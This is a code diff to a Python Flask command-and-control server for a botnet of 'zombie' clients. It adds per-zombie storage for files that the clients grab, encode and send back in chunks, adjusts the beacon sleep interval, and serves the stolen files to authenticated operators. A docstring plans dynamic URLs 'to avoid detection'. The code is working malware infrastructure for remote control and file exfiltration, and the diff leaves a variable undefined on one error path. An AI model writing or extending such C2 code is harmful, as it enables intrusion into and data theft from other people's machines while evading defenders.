@@ -28,6 +28,7 @@ class Server:
 
     #Should below also take a database object to manipulate on creation?
     def __init__(self,base_path):
+        self.base_path = base_path
         self.config_routes()
         logger.debug("routes configured")
         self.build_webdirs(base_path)
@@ -36,14 +37,10 @@ class Server:
         logger.debug("DB initialized")
         # Setup Flask App settings. 
         self.app.config['UPLOAD_FOLDER'] = 'files/post/'
-        try:
-            base_path = environ['base_path']
-        except KeyError as e:
-            logger.error("[-] Unable to find base_path variable, setting to defualt './'")
-            base_path = './'
+
         # ROOT_PATH is for where the webserver templates live. 
-        self.app.config['ROOT_PATH'] = base_path # not sure if this is needed
-        home = environ['HOME']
+        #self.app.config['ROOT_PATH'] = base_path # not sure if this is needed
+        #home = environ['HOME']
         scrub = multiprocessing.Process(target=self.scrub_loop, args=(self.db,))
         scrub.start() # I want this in Server as well.
         logger.debug("Started scrub")
@@ -268,11 +265,20 @@ class Server:
                     auth = self.db.is_authd(auth_token)
                     logger.debug(f"auth is {auth}")
                     if auth:
-                        uploads = path.join(self.app.config['ROOT_PATH'], self.app.config['UPLOAD_FOLDER'])
-                        logger.debug(f"UPLOADING FROM: {uploads}")
+                        try:
+                            zombieID = filename.split("-")[0]
+                            home_dir = self.base_path / "files" / "zombies" / zombieID
+                            if home_dir.exists():
+                                upload_dir = home_dir / zombieID / "post"
+                            else:
+                                logger.error("Zombie ID not found!!")
+                        except Exception as e:
+                            logger.error(f"Exception occured: {e}")
+                        # uploads = path.join(self.app.config['ROOT_PATH'], self.app.config['UPLOAD_FOLDER'])
+                        logger.debug(f"UPLOADING FROM: {upload_dir}")
                         file = f"{filename}"
-                        print(f"file is {uploads}/{file}")
-                        return send_from_directory(uploads, file)
+                        print(f"file is {upload_dir}/{file}")
+                        return send_from_directory(upload_dir, file)
                     else:
                         logger.debug(f"TOKEN: {auth_token} INVALID")
                         return redirect("/login", 302)
@@ -298,7 +304,7 @@ class Server:
             zombieID = content['X-Client-ID']
             #logger.debug(f"found zombieID: {zombieID}")
             # Static value to determine how long to sleep, need build a way to set dynamically
-            sleepLength = 3
+            sleepLength = 6
             con = self.db.get_con(self.db.name)
             cur = self.db.get_cur(con)
             # check here if zombie has command available
@@ -355,6 +361,10 @@ class Server:
             - Server sends command to get file
             - zombie grabs file, encodes, then sends in pages if too large.
 
+            - server saves file or chunks to ./files/zombieID/pre/token
+            - server decodes file from ./files/zombieID/pre/token and saves to ./files/zombieID/post/token
+            - server sends command to get file
+            - zombie grabs file, encodes, then sends in pages if too large.
         - Nice to have:
             - generate dynamic urls here to avoid detection
         """
@@ -362,6 +372,7 @@ class Server:
         def sendto():
             logger.info(f"Recieved {request.method} request to /sendto from {request.remote_addr}")
             content = request.get_json()
+            logger.debug(f"found content: {content}")
             data = content['data']
             zombieID = content['X-Client-ID']
             try:
@@ -373,7 +384,7 @@ class Server:
                 # handle files sent to server
                 logger.debug(f"pageID:{pageID}")
                 if pageID == 'END':
-                    ioFile = ioFiles.ioFiles(zombieID)
+                    ioFile = ioFiles.ioFiles(zombieID,self.base_path)
                     if(ioFile.write_chunk(data)):
                         logger.debug("Last data has been written")
                     else:
@@ -388,7 +399,7 @@ class Server:
                     return jsonify(body) 
                 else:
                     logger.debug("SAVING CHUNK TO FILE")
-                    ioFile = ioFiles.ioFiles(zombieID)
+                    ioFile = ioFiles.ioFiles(zombieID,self.base_path)
                     ioFile.write_chunk(data)
                     logger.debug("CHUNK SAVED")
                     body = {"X-Server-Version":"3"}
@@ -419,6 +430,8 @@ class Server:
                 return jsonify(body)
             else:
                 body = {"ERROR":"YOU SHOULDN'T BE HERE"}
+                logger.error(f"{request.remote_addr} requested but didn't have ID.")
+                # Need to block IP here
                 return jsonify(body)
               
     def run(self):
@@ -429,11 +442,13 @@ class Server:
         """
         build webroot dir structure based on base_path
         file structure:
-        <path_to_c2-base>/
+        <path_to_c2-base>/ this is base_path envvar
             /files
-                /pre/
-                /post/
-                /stale/
+                /zombies/
+                    XYZ/ # starting with zombieIDs, ioFiles will take over
+                        /pre
+                        /post
+                        /stale
         """
         base_dir = Path(base_path)
         if base_dir.is_dir():
@@ -444,15 +459,13 @@ class Server:
                 logger.debug("dir 'files' already created, skipping")
             except Exception as e:
                 logger.error(f"Unable to create directory structure with error {e}")
-            for x in ["pre","post","stale"]:
-                try:
-                    to_add = files / x
-                    to_add.mkdir()
-                except FileExistsError:
-                    continue
-                except Exception as e:
-                    logger.error(f"Couldn't create path {x}, found error: {e}")
-                    return False
+            zombies = files / "zombies"
+            try:
+                zombies.mkdir()
+            except FileExistsError as e:
+                logger.debug("dir 'zombies' already created, skipping")
+            except Exception as e:
+                logger.error(f"Unable to create directory structure with error {e}")
             return True
         else:
             try:
